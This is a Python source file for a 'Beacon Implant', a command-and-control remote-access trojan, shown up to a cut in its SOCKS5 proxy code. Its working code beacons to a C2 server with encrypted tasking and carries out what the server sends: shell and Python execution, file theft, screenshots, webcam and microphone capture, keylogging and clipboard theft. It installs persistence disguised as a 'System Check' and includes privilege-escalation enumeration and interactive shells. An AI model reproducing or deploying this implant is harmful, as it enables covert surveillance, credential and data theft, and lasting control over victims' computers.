#!/usr/bin/python3

# Purpose: Beacon Implant — full-featured web UI edition.
# Author: Israel Fernandez
# Date of creation: April 9, 2026

import base64
import ctypes
import fcntl
import hashlib
import hmac
import io
import json
import mmap
import os
import platform
import random
import select
import shlex
import socket
import stat
import struct
import subprocess
import sys
import tempfile
import threading
import time
import uuid

import requests

# ── C2 connectivity ───────────────────────────────────────────────────────────
C2_URLS = ["https://localhost:9443"]

_DIR        = os.path.dirname(os.path.abspath(__file__))
_C2_DIR     = os.path.join(_DIR, "..", "C2")
CA_CERT     = os.path.join(_C2_DIR, "ca.crt")
CLIENT_CERT = (os.path.join(_C2_DIR, "c2.crt"), os.path.join(_C2_DIR, "c2.key"))

ENDPOINT_KEY = b"41447568f68e1377515ec0dfa4bd5918a7dcbb5cad1a901ad708a3b7e49e273bf48e850784d094a2b1bb5f460a7a891221f96699c06a0705528afd3c0f2961fd"


def _derive_endpoints(key):
    def slug(label):
        return hmac.new(key, label.encode(), hashlib.sha256).hexdigest()[:16]
    return {"register": slug("register"), "tasks": slug("tasks"), "results": slug("results")}


ENDPOINT = _derive_endpoints(ENDPOINT_KEY)

BEACON_INTERVAL          = 20
JITTER                   = 0.2
IMPLANT_ID               = str(uuid.uuid4())
MAX_FAILURES_BEFORE_ROTATE = 3

# ── AES-GCM application-layer encryption ─────────────────────────────────────
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM
    import hashlib as _hl
    _ENC_KEY     = _hl.sha256(ENDPOINT_KEY + b"task-enc-v1").digest()
    _HAVE_CRYPTO = True
except ImportError:
    _HAVE_CRYPTO = False


def _enc(data: dict) -> dict:
    if not _HAVE_CRYPTO:
        return data
    nonce = os.urandom(12)
    ct    = _AESGCM(_ENC_KEY).encrypt(nonce, json.dumps(data).encode(), None)
    return {"_enc": base64.b64encode(nonce + ct).decode()}


def _dec(data: dict) -> dict:
    if "_enc" not in data or not _HAVE_CRYPTO:
        return data
    blob      = base64.b64decode(data["_enc"])
    nonce, ct = blob[:12], blob[12:]
    pt        = _AESGCM(_ENC_KEY).decrypt(nonce, ct, None)
    return json.loads(pt)


# ── Session / sleep ───────────────────────────────────────────────────────────
def _session():
    s = requests.Session()
    s.verify = CA_CERT
    s.cert   = CLIENT_CERT
    return s


def _sleep():
    jitter = random.uniform(1 - JITTER, 1 + JITTER)
    time.sleep(BEACON_INTERVAL * jitter)


# ── Module-level state ────────────────────────────────────────────────────────
_keylog_buffer   = []
_keylog_lock     = threading.Lock()
_keylog_listener = None

_pty_sessions    = {}   # {session_id: {"master_fd": int, "proc": Popen}}
_pty_lock        = threading.Lock()

_socks_server    = None
_socks_lock      = threading.Lock()


# ── Handlers ──────────────────────────────────────────────────────────────────

def handle_execute(task):
    cmd_str = task.get("command", "").strip()
    if not cmd_str:
        return {"ok": False, "error": "No command specified", "command": ""}
    try:
        if platform.system() == "Windows":
            # On Windows, use shell=True so cmd.exe builtins (dir, echo, etc.) work
            res = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=120)
        else:
            res = subprocess.run(shlex.split(cmd_str), capture_output=True, text=True, timeout=120)
        return {"ok": True, "output": res.stdout + res.stderr, "command": cmd_str}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "Command timed out (120s)", "command": cmd_str}
    except OSError as e:
        return {"ok": False, "error": str(e), "command": cmd_str}


def handle_upload(task):
    try:
        if "file" not in task or "filename" not in task:
            return {"ok": False, "error": "Missing file or filename"}
        data = base64.b64decode(task["file"], validate=True)
        with open(task["filename"], "wb") as f:
            f.write(data)
        return {"ok": True, "output": f"Wrote {len(data)} bytes to {task['filename']}"}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def handle_download(task):
    try:
        if "filepath" not in task:
            return {"ok": False, "error": "Missing filepath"}
        with open(task["filepath"], "rb") as f:
            data = f.read()
        return {"ok": True, "data": base64.b64encode(data).decode("utf-8"), "filepath": task["filepath"]}
    except OSError as e:
        return {"ok": False, "error": str(e)}


def handle_set_interval(task):
    global BEACON_INTERVAL
    val = int(task.get("interval", 0))
    if val <= 0:
        return {"ok": False, "error": f"Invalid interval: {val} (must be > 0)"}
    BEACON_INTERVAL = val
    return {"ok": True, "output": f"Beacon interval set to {BEACON_INTERVAL}s"}


def handle_screenshot(_task):
    try:
        import mss
        import PIL.Image
        with mss.mss() as sct:
            mon   = sct.monitors[1]
            sshot = sct.grab(mon)
            img   = PIL.Image.frombytes("RGB", sshot.size, sshot.bgra, "raw", "BGRX")
            buf   = io.BytesIO()
            img.save(buf, format="PNG")
        return {"ok": True, "format": "png", "data": base64.b64encode(buf.getvalue()).decode()}
    except Exception as e1:
        try:
            with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
                path = f.name
            subprocess.run(["scrot", path], timeout=10, capture_output=True, check=True)
            with open(path, "rb") as f:
                data = f.read()
            os.unlink(path)
            return {"ok": True, "format": "png", "data": base64.b64encode(data).decode()}
        except Exception as e2:
            return {"ok": False, "error": f"screenshot unavailable: {e1}; scrot: {e2}"}


def handle_webcam_snap(task):
    device = task.get("device", "/dev/video0")
    tmp = None
    try:
        import cv2
        idx = 0
        if isinstance(device, int):
            idx = device
        elif "/dev/video" in str(device):
            try:
                idx = int(str(device).replace("/dev/video", ""))
            except ValueError:
                idx = 0
        cap = cv2.VideoCapture(idx)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            raise RuntimeError("cv2: failed to read frame")
        _, buf = cv2.imencode(".jpg", frame)
        return {"ok": True, "format": "jpeg", "data": base64.b64encode(buf.tobytes()).decode()}
    except Exception as e1:
        try:
            with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
                tmp = f.name
            subprocess.run(["fswebcam", "-d", str(device), "-r", "640x480",
                            "--no-banner", tmp],
                           timeout=15, capture_output=True, check=True)
            with open(tmp, "rb") as f:
                data = f.read()
            os.unlink(tmp); tmp = None
            return {"ok": True, "format": "jpeg", "data": base64.b64encode(data).decode()}
        except Exception as e2:
            try:
                with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
                    tmp = f.name
                subprocess.run(
                    ["ffmpeg", "-y", "-f", "v4l2", "-i", str(device),
                     "-frames:v", "1", tmp],
                    timeout=15, capture_output=True, check=True)
                with open(tmp, "rb") as f:
                    data = f.read()
                os.unlink(tmp); tmp = None
                return {"ok": True, "format": "jpeg", "data": base64.b64encode(data).decode()}
            except Exception as e3:
                return {"ok": False, "error": f"webcam unavailable: cv2: {e1}; fswebcam: {e2}; ffmpeg: {e3}"}
    finally:
        if tmp and os.path.exists(tmp):
            try:
                os.unlink(tmp)
            except OSError:
                pass


def handle_mic_record(task):
    duration = int(task.get("duration", 5))
    if duration <= 0 or duration > 300:
        return {"ok": False, "error": "Duration must be 1–300 seconds"}
    device = task.get("device", "default")
    tmp = None
    try:
        import sounddevice as sd
        import scipy.io.wavfile
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype="int16")
        sd.wait()
        buf = io.BytesIO()
        scipy.io.wavfile.write(buf, fs, recording)
        return {"ok": True, "format": "wav", "duration": duration,
                "data": base64.b64encode(buf.getvalue()).decode()}
    except Exception as e1:
        try:
            with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as f:
                tmp = f.name
            subprocess.run(["arecord", "-D", str(device), "-d", str(duration),
                            "-f", "cd", tmp],
                           timeout=duration + 10, capture_output=True, check=True)
            with open(tmp, "rb") as f:
                data = f.read()
            os.unlink(tmp); tmp = None
            return {"ok": True, "format": "wav", "duration": duration,
                    "data": base64.b64encode(data).decode()}
        except Exception as e2:
            try:
                with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as f:
                    tmp = f.name
                subprocess.run(
                    ["ffmpeg", "-y", "-f", "alsa", "-i", str(device),
                     "-t", str(duration), tmp],
                    timeout=duration + 10, capture_output=True, check=True)
                with open(tmp, "rb") as f:
                    data = f.read()
                os.unlink(tmp); tmp = None
                return {"ok": True, "format": "wav", "duration": duration,
                        "data": base64.b64encode(data).decode()}
            except Exception as e3:
                return {"ok": False,
                        "error": f"mic unavailable: sounddevice: {e1}; arecord: {e2}; ffmpeg: {e3}"}
    finally:
        if tmp and os.path.exists(tmp):
            try:
                os.unlink(tmp)
            except OSError:
                pass


def handle_keylog_start(_task):
    global _keylog_listener
    try:
        from pynput import keyboard as _kb

        def _on_press(key):
            try:
                ch = key.char or ""
            except AttributeError:
                ch = f"[{key.name}]"
            with _keylog_lock:
                _keylog_buffer.append(ch)

        if _keylog_listener is None or not getattr(_keylog_listener, "running", False):
            _keylog_listener = _kb.Listener(on_press=_on_press)
            _keylog_listener.start()
        return {"ok": True, "output": "Keylogger started"}
    except Exception as e:
        return {"ok": False, "error": f"pynput not installed or no display: {e}"}


def handle_keylog_dump(_task):
    with _keylog_lock:
        result = "".join(_keylog_buffer)
        _keylog_buffer.clear()
    return {"ok": True, "output": result}


def handle_keylog_stop(_task):
    global _keylog_listener
    try:
        if _keylog_listener and hasattr(_keylog_listener, "stop"):
            _keylog_listener.stop()
        _keylog_listener = None
    except Exception:
        pass
    with _keylog_lock:
        _keylog_buffer.clear()
    return {"ok": True, "output": "Keylogger stopped"}


def handle_clipboard(_task):
    sys_plat = platform.system()
    # Windows: PowerShell Get-Clipboard
    if sys_plat == "Windows":
        try:
            r = subprocess.run(
                ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
                capture_output=True, text=True, timeout=10
            )
            return {"ok": True, "output": r.stdout}
        except Exception as e:
            return {"ok": False, "error": f"clipboard: {e}"}
    # macOS: pbpaste
    if sys_plat == "Darwin":
        try:
            r = subprocess.run(["pbpaste"], capture_output=True, text=True, timeout=5)
            return {"ok": True, "output": r.stdout}
        except Exception as e:
            return {"ok": False, "error": f"clipboard: {e}"}
    # Linux: pyperclip, then xclip/xsel/wl-paste
    try:
        import pyperclip
        return {"ok": True, "output": pyperclip.paste()}
    except Exception:
        pass
    for cmd in [["xclip", "-selection", "clipboard", "-o"],
                ["xsel", "--clipboard", "--output"],
                ["wl-paste"]]:
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if res.returncode == 0:
                return {"ok": True, "output": res.stdout}
        except Exception:
            pass
    return {"ok": False, "error": "No clipboard tool available (pyperclip/xclip/xsel/wl-paste)"}


def _script_path():
    return os.path.abspath(__file__)


def handle_persist(task):
    method = task.get("method", "crontab")
    spath  = _script_path()
    marker = f"# .sys_chk_{os.path.basename(spath)}"
    sys_plat = platform.system()

    # ── Windows persistence ────────────────────────────────────────────────────
    if sys_plat == "Windows":
        if method in ("registry", "crontab"):  # "crontab" is the default; map to registry on Windows
            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                val_name = f"SysChk_{os.path.basename(spath)[:20]}"
                cmd_val  = f'"{sys.executable}" "{spath}"'
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
                                    winreg.KEY_READ | winreg.KEY_WRITE) as k:
                    try:
                        existing, _ = winreg.QueryValueEx(k, val_name)
                        if existing == cmd_val:
                            return {"ok": True, "output": f"Already persisted in registry: {val_name}"}
                    except FileNotFoundError:
                        pass
                    winreg.SetValueEx(k, val_name, 0, winreg.REG_SZ, cmd_val)
                return {"ok": True, "output": f"Installed registry Run key: {val_name}"}
            except Exception as e:
                return {"ok": False, "error": f"registry persist: {e}"}

        if method == "startup":
            try:
                startup = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
                bat     = os.path.join(startup, "sys_chk.bat")
                if os.path.exists(bat):
                    return {"ok": True, "output": f"Already persisted in startup: {bat}"}
                with open(bat, "w") as f:
                    f.write(f'@echo off\nstart "" "{sys.executable}" "{spath}"\n')
                return {"ok": True, "output": f"Installed startup bat: {bat}"}
            except Exception as e:
                return {"ok": False, "error": f"startup persist: {e}"}

        return {"ok": False, "error": f"Unknown Windows persist method: {method} (use: registry, startup)"}

    # ── POSIX persistence (Linux + macOS) ──────────────────────────────────────
    if method == "crontab":
        try:
            res     = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            current = res.stdout if res.returncode == 0 else ""
            if spath in current:
                return {"ok": True, "output": f"Already persisted in crontab: {spath}"}
            entry = f"@reboot {sys.executable} {spath}\n"
            subprocess.run(["crontab", "-"], input=current + entry, text=True, check=True)
            return {"ok": True, "output": f"Installed crontab entry for {spath}"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    if method == "bashrc":
        bashrc = os.path.expanduser("~/.bashrc")
        try:
            with open(bashrc, "r") as f:
                content = f.read()
            if marker in content:
                return {"ok": True, "output": "Already persisted in .bashrc"}
            with open(bashrc, "a") as f:
                f.write(f"\n{marker}\n{sys.executable} {spath} &\n")
            return {"ok": True, "output": f"Installed .bashrc entry for {spath}"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    if method == "systemd":
        try:
            unit_name = f"sys_chk_{os.path.basename(spath).replace('.', '_')}.service"
            unit_dir  = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(unit_dir, exist_ok=True)
            unit_path = os.path.join(unit_dir, unit_name)
            if os.path.exists(unit_path):
                return {"ok": True, "output": f"Already persisted as systemd unit: {unit_name}"}
            with open(unit_path, "w") as f:
                f.write(f"[Unit]\nDescription=System Check\n\n"
                        f"[Service]\nExecStart={sys.executable} {spath}\nRestart=always\n\n"
                        f"[Install]\nWantedBy=default.target\n")
            subprocess.run(["systemctl", "--user", "enable", unit_name], capture_output=True)
            return {"ok": True, "output": f"Installed systemd unit {unit_name}"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    return {"ok": False, "error": f"Unknown method: {method}"}


def handle_unpersist(_task):
    spath    = _script_path()
    marker   = f"# .sys_chk_{os.path.basename(spath)}"
    removed  = []
    sys_plat = platform.system()

    # ── Windows unpersist ──────────────────────────────────────────────────────
    if sys_plat == "Windows":
        # Registry Run key
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            val_name = f"SysChk_{os.path.basename(spath)[:20]}"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
                                winreg.KEY_READ | winreg.KEY_WRITE) as k:
                try:
                    winreg.DeleteValue(k, val_name)
                    removed.append(f"registry:{val_name}")
                except FileNotFoundError:
                    pass
        except Exception:
            pass
        # Startup folder bat
        try:
            bat = os.path.join(os.environ.get("APPDATA", ""),
                               r"Microsoft\Windows\Start Menu\Programs\Startup\sys_chk.bat")
            if os.path.exists(bat):
                os.remove(bat)
                removed.append("startup:sys_chk.bat")
        except Exception:
            pass
        msg = f"Removed: {', '.join(removed)}" if removed else "No Windows persistence found"
        return {"ok": True, "output": msg}

    # ── POSIX unpersist (Linux + macOS) ───────────────────────────────────────
    # Crontab
    try:
        res = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        if res.returncode == 0 and spath in res.stdout:
            new_lines = [l for l in res.stdout.splitlines(keepends=True) if spath not in l]
            subprocess.run(["crontab", "-"], input="".join(new_lines), text=True, check=True)
            removed.append("crontab")
    except Exception:
        pass

    # .bashrc
    bashrc = os.path.expanduser("~/.bashrc")
    try:
        with open(bashrc, "r") as f:
            lines = f.readlines()
        filtered  = []
        skip_next = False
        for line in lines:
            if skip_next:
                skip_next = False
                continue
            if marker in line:
                skip_next = True
                continue
            filtered.append(line)
        if len(filtered) != len(lines):
            with open(bashrc, "w") as f:
                f.writelines(filtered)
            removed.append("bashrc")
    except Exception:
        pass

    # macOS LaunchAgent
    if sys_plat == "Darwin":
        try:
            plist = os.path.expanduser("~/Library/LaunchAgents/com.sys.check.plist")
            if os.path.exists(plist):
                subprocess.run(["launchctl", "unload", plist], capture_output=True)
                os.remove(plist)
                removed.append("launchagent")
        except Exception:
            pass

    # Systemd (Linux only)
    if sys_plat == "Linux":
        try:
            unit_name = f"sys_chk_{os.path.basename(spath).replace('.', '_')}.service"
            unit_path = os.path.join(os.path.expanduser("~/.config/systemd/user"), unit_name)
            if os.path.exists(unit_path):
                subprocess.run(["systemctl", "--user", "disable", unit_name], capture_output=True)
                os.remove(unit_path)
                removed.append(f"systemd:{unit_name}")
        except Exception:
            pass

    msg = f"Removed persistence from: {', '.join(removed)}" if removed else "No persistence entries found"
    return {"ok": True, "output": msg}


def handle_privesc_enum(_task):
    lines    = []
    sys_plat = platform.system()

    # ── Windows privesc ────────────────────────────────────────────────────────
    if sys_plat == "Windows":
        lines.append("[ID]")
        try:
            r = subprocess.run(["whoami", "/all"], capture_output=True, text=True, timeout=10)
            lines.append(r.stdout.strip())
        except Exception as e:
            lines.append(f"error: {e}")

        lines.append("\n[SUDO]")
        try:
            r = subprocess.run(["net", "localgroup", "administrators"],
                               capture_output=True, text=True, timeout=10)
            lines.append(r.stdout.strip() or "(none)")
        except Exception as e:
            lines.append(f"error: {e}")

        lines.append("\n[SUID]")
        lines.append("(not applicable on Windows)")

        lines.append("\n[WRITABLE /etc]")
        lines.append("(not applicable on Windows)")

        lines.append("\n[CAPABILITIES]")
        try:
            r = subprocess.run(["whoami", "/priv"], capture_output=True, text=True, timeout=10)
            lines.append(r.stdout.strip() or "(none)")
        except Exception as e:
            lines.append(f"error: {e}")

        lines.append("\n[ENVIRONMENT]")
        try:
            env = {k: v for k, v in os.environ.items()
                   if any(k.upper().startswith(p) for p in ("PATH", "USERNAME", "USERPROFILE",
                                                              "SYSTEMROOT", "COMSPEC", "TEMP"))}
            lines.append("\n".join(f"{k}={v}" for k, v in env.items()))
        except Exception as e:
            lines.append(f"error: {e}")

        return {"ok": True, "output": "\n".join(lines)}

    # ── POSIX privesc (Linux + macOS) ─────────────────────────────────────────
    lines.append("[ID]")
    try:
        r = subprocess.run(["id"], capture_output=True, text=True)
        lines.append(r.stdout.strip())
    except Exception as e:
        lines.append(f"error: {e}")

    lines.append("\n[SUDO]")
    try:
        r = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=10)
        lines.append(r.stdout.strip() or "(none)")
    except Exception as e:
        lines.append(f"error: {e}")

    lines.append("\n[SUID]")
    try:
        suid = []
        for d in ["/usr/bin", "/usr/sbin", "/bin", "/sbin", "/usr/local/bin"]:
            if not os.path.isdir(d):
                continue
            for fname in os.listdir(d):
                fp = os.path.join(d, fname)
                try:
                    if os.stat(fp).st_mode & stat.S_ISUID:
                        suid.append(fp)
                except OSError:
                    pass
        lines.append("\n".join(suid) if suid else "(none found)")
    except Exception as e:
        lines.append(f"error: {e}")

    lines.append("\n[WRITABLE /etc]")
    try:
        writable = [os.path.join("/etc", n) for n in os.listdir("/etc")
                    if os.access(os.path.join("/etc", n), os.W_OK)]
        lines.append("\n".join(writable) if writable else "(none)")
    except Exception as e:
        lines.append(f"error: {e}")

    lines.append("\n[CAPABILITIES]")
    try:
        if sys_plat == "Darwin":
            r = subprocess.run(["csrutil", "status"], capture_output=True, text=True, timeout=10)
        else:
            r = subprocess.run(
                ["getcap", "-r", "/usr/bin", "/usr/sbin", "/bin", "/sbin"],
                capture_output=True, text=True, timeout=10
            )
        lines.append(r.stdout.strip() or "(none)")
    except Exception as e:
        lines.append(f"error: {e}")

    lines.append("\n[ENVIRONMENT]")
    try:
        prefixes = ("LD_", "DYLD_", "PATH", "HOME", "USER", "SUDO") if sys_plat != "Darwin" \
                   else ("DYLD_", "PATH", "HOME", "USER", "SUDO")
        env = {k: v for k, v in os.environ.items()
               if any(k.startswith(p) for p in prefixes)}
        lines.append("\n".join(f"{k}={v}" for k, v in env.items()))
    except Exception as e:
        lines.append(f"error: {e}")

    return {"ok": True, "output": "\n".join(lines)}


def handle_exec_python(task):
    code = task.get("code", "").strip()
    if not code:
        return {"ok": False, "error": "No code provided"}
    buf        = io.StringIO()
    old_stdout = sys.stdout
    sys.stdout = buf
    try:
        exec(code, {})  # pylint: disable=exec-used
        output = buf.getvalue()
        return {"ok": True, "output": output if output else "(no output)"}
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}
    finally:
        sys.stdout = old_stdout


def handle_sysinfo(_task):
    import datetime as _dt
    import re as _re
    try:
        sys_plat = platform.system()
        lines = [
            f"Hostname: {platform.node()}",
            f"OS: {sys_plat} {platform.release()} {platform.version()}",
            f"Arch: {platform.machine()}",
            f"User: {os.getenv('USER', os.getenv('USERNAME', 'unknown'))}",
            f"PID: {os.getpid()}",
        ]

        # Memory
        try:
            if sys_plat == "Windows":
                r = subprocess.run(
                    ["wmic", "OS", "get", "TotalVisibleMemorySize", "/Value"],
                    capture_output=True, text=True, timeout=10
                )
                for ln in r.stdout.splitlines():
                    if ln.strip().startswith("TotalVisibleMemorySize="):
                        kb = int(ln.split("=", 1)[1].strip())
                        lines.append(f"Memory: {kb // 1024} MB")
                        break
                else:
                    lines.append("Memory: unknown")
            elif sys_plat == "Linux":
                with open("/proc/meminfo") as f:
                    for ln in f:
                        if ln.startswith("MemTotal:"):
                            lines.append(f"Memory: {ln.split(':')[1].strip()}")
                            break
            elif sys_plat == "Darwin":
                r = subprocess.run(["sysctl", "-n", "hw.memsize"],
                                   capture_output=True, text=True, timeout=5)
                lines.append(f"Memory: {int(r.stdout.strip()) // (1024 * 1024)} MB")
            else:
                lines.append("Memory: unknown")
        except Exception:
            lines.append("Memory: unknown")

        # Uptime
        try:
            if sys_plat == "Windows":
                r = subprocess.run(
                    ["wmic", "OS", "get", "LastBootUpTime", "/Value"],
                    capture_output=True, text=True, timeout=10
                )
                for ln in r.stdout.splitlines():
                    if ln.strip().startswith("LastBootUpTime="):
                        boot_str = ln.split("=", 1)[1].strip().split(".")[0]
                        boot_dt  = _dt.datetime.strptime(boot_str, "%Y%m%d%H%M%S")
                        up       = _dt.datetime.now() - boot_dt
                        h, rem   = divmod(int(up.total_seconds()), 3600)
                        mi, s    = divmod(rem, 60)
                        lines.append(f"Uptime: {h}h {mi}m {s}s")
                        break
            elif sys_plat == "Linux":
                with open("/proc/uptime") as f:
                    up = float(f.read().split()[0])
                h, rem = divmod(int(up), 3600)
                m, s   = divmod(rem, 60)
                lines.append(f"Uptime: {h}h {m}m {s}s")
            elif sys_plat == "Darwin":
                r   = subprocess.run(["sysctl", "-n", "kern.boottime"],
                                     capture_output=True, text=True, timeout=5)
                hit = _re.search(r"sec\s*=\s*(\d+)", r.stdout)
                if hit:
                    boot_dt = _dt.datetime.fromtimestamp(int(hit.group(1)))
                    up      = _dt.datetime.now() - boot_dt
                    h, rem  = divmod(int(up.total_seconds()), 3600)
                    mi, s   = divmod(rem, 60)
                    lines.append(f"Uptime: {h}h {mi}m {s}s")
        except Exception:
            pass

        # CPU
        try:
            if sys_plat == "Linux":
                with open("/proc/cpuinfo") as f:
                    for ln in f:
                        if "model name" in ln:
                            lines.append(f"CPU: {ln.split(':')[1].strip()}")
                            break
            elif sys_plat == "Darwin":
                r   = subprocess.run(["sysctl", "-n", "machdep.cpu.brand_string"],
                                     capture_output=True, text=True, timeout=5)
                cpu = r.stdout.strip()
                if cpu:
                    lines.append(f"CPU: {cpu}")
            elif sys_plat == "Windows":
                cpu = platform.processor()
                if cpu:
                    lines.append(f"CPU: {cpu}")
        except Exception:
            pass

        return {"ok": True, "output": "\n".join(lines)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def handle_ps(_task):
    try:
        entries = []
        if platform.system() == "Windows":
            r = subprocess.run(["tasklist", "/fo", "csv", "/nh"],
                               capture_output=True, text=True, timeout=10)
            for line in r.stdout.splitlines():
                parts = [p.strip('"') for p in line.strip().split('","')]
                if len(parts) >= 2:
                    try:
                        pid = int(parts[1])
                    except (ValueError, IndexError):
                        pid = 0
                    entries.append({
                        "user": "unknown", "pid": pid,
                        "cpu": "0", "mem": "0", "vsz": "0", "rss": "0",
                        "tty": "?", "stat": "?", "start": "?", "time": "0",
                        "cmd": parts[0],
                    })
        else:
            r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
            for line in r.stdout.splitlines()[1:]:
                parts = line.split(None, 10)
                if len(parts) < 11:
                    continue
                try:
                    pid = int(parts[1])
                except ValueError:
                    continue
                entries.append({
                    "user":  parts[0], "pid":   pid,
                    "cpu":   parts[2], "mem":   parts[3],
                    "vsz":   parts[4], "rss":   parts[5],
                    "tty":   parts[6], "stat":  parts[7],
                    "start": parts[8], "time":  parts[9],
                    "cmd":   parts[10],
                })
        return {"ok": True, "format": "ps", "entries": entries}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def handle_ls(task):
    path = task.get("path", ".")
    try:
        if not os.path.exists(path):
            return {"ok": False, "error": f"Path not found: {path}"}
        entries = []
        for name in sorted(os.listdir(path)):
            full = os.path.join(path, name)
            try:
                st = os.lstat(full)
                if stat.S_ISLNK(st.st_mode):
                    etype = "l"
                elif stat.S_ISDIR(st.st_mode):
                    etype = "d"
                elif stat.S_ISREG(st.st_mode):
                    etype = "f"
                else:
                    etype = "?"
                entries.append({
                    "name":  name,
                    "type":  etype,
                    "perms": oct(st.st_mode)[-4:],
                    "size":  st.st_size,
                    "path":  full,
                })
            except OSError:
                entries.append({"name": name, "type": "?", "perms": "0000", "size": 0, "path": full})
        return {"ok": True, "format": "ls", "entries": entries}
    except OSError as e:
        return {"ok": False, "error": str(e)}


def handle_netstat(_task):
    sys_plat = platform.system()
    try:
        if sys_plat == "Windows":
            r = subprocess.run(["netstat", "-ano"], capture_output=True, text=True, timeout=10)
        elif sys_plat == "Darwin":
            r = subprocess.run(["netstat", "-an"], capture_output=True, text=True, timeout=10)
        else:
            try:
                r = subprocess.run(["ss", "-tnp"], capture_output=True, text=True, timeout=10)
                if r.returncode != 0:
                    raise OSError("ss failed")
            except Exception:
                r = subprocess.run(["netstat", "-tnp"], capture_output=True, text=True, timeout=10)
        return {"ok": True, "output": r.stdout, "format": "netstat"}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def handle_kill_process(task):
    pid = task.get("pid")
    if pid is None:
        return {"ok": False, "error": "Missing pid"}
    sig = int(task.get("signal", 15))
    try:
        os.kill(int(pid), sig)
        return {"ok": True, "output": f"Signal {sig} sent to PID {pid}"}
    except OSError as e:
        return {"ok": False, "error": str(e)}


# ── Interactive shell (PTY) ───────────────────────────────────────────────────

def handle_shell_open(_task):
    try:
        import pty
        master_fd, slave_fd = pty.openpty()
        proc = subprocess.Popen(
            ["/bin/bash"],
            stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
            close_fds=True,
        )
        os.close(slave_fd)
        flags = fcntl.fcntl(master_fd, fcntl.F_GETFL)
        fcntl.fcntl(master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
        sid = str(uuid.uuid4())
        with _pty_lock:
            _pty_sessions[sid] = {"master_fd": master_fd, "proc": proc}
        return {"ok": True, "session_id": sid}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def handle_shell_send(task):
    sid = task.get("session_id")
    if not sid:
        return {"ok": False, "error": "Missing session_id"}
    with _pty_lock:
        session = _pty_sessions.get(sid)
    if session is None:
        return {"ok": False, "error": f"Unknown session: {sid}"}

    master_fd = session["master_fd"]
    inp       = task.get("input", "")
    timeout   = float(task.get("timeout", 0.0))

    if inp:
        try:
            os.write(master_fd, (inp + "\n").encode())
        except OSError as e:
            return {"ok": False, "error": f"Write failed: {e}"}

    output = b""
    if timeout > 0:
        deadline = time.time() + timeout
        while True:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            try:
                r, _, _ = select.select([master_fd], [], [], remaining)
                if not r:
                    break
                chunk = os.read(master_fd, 4096)
                if not chunk:
                    break
                output += chunk
            except (OSError, ValueError):
                break
    else:
        try:
            r, _, _ = select.select([master_fd], [], [], 0.0)
            if r:
                output = os.read(master_fd, 4096)
        except (OSError, ValueError):
            pass

    return {"ok": True, "output": output.decode("utf-8", errors="replace")}


def handle_shell_close(task):
    sid = task.get("session_id")
    if not sid:
        return {"ok": False, "error": "Missing session_id"}
    with _pty_lock:
        session = _pty_sessions.pop(sid, None)
    if session is None:
        return {"ok": False, "error": f"Unknown session: {sid}"}
    try:
        session["proc"].terminate()
        session["proc"].wait(timeout=3)
    except Exception:
        try:
            session["proc"].kill()
        except Exception:
            pass
    try:
        os.close(session["master_fd"])
    except OSError:
        pass
    return {"ok": True, "output": f"Session {sid} closed"}


# ── SOCKS5 proxy ──────────────────────────────────────────────────────────────

class _Socks5Server:
    def __init__(self, host, port):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((host, port))
        self._sock.listen(32)
        self.port     = self._sock.getsockname()[1]
        self._running = True
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def stop(self):
        self._running = False
        try:
            self._sock.close()
        except Exception:
            pass

    def _accept_loop(self):
        while self._running:
            try:
                client, _ = self._sock.accept()
                threading.Thread(target=self._handle, args=(client,), daemon=True).start()
            except Exception:
                break

    def _handle(self, client):
        try:
            hdr = client.recv(2)
            if len(hdr) < 2 or hdr[0] != 5:
                client.close()
                return
            client.recv(hdr[1])         # consume methods
            client.sendall(b"\x05\x00") # no-auth

            req = client.recv(4)
            if len(req) < 4 or req[0] != 5 or req[1] != 1:
                client.sendall(b"\x05\x07\x00\x01" + b"\x00" * 6)
                client.close()
                return

            atyp = req[3]
            if atyp == 1:
                host = socket.inet_ntoa(client.recv(4))
            elif atyp == 3:
                length = client.recv(1)[0]
                host   = client.recv(length).decode()
            elif atyp == 4:
                host = socket.inet_ntop(socket.AF_INET6, client.recv(16))
            else:
                client.sendall(b"\x05\x08\x00\x01" + b"\x00" * 6)
                client.close()
                return

            port = struct.unpack("!H", client.recv(2))[0]

            try:
                remote = socket.create_connection((host, port), timeout=10)
            except Exception:
                client.sendall(b"\x05\x05\x00\x01" + b"\x00" * 6)
                client.close()
                return

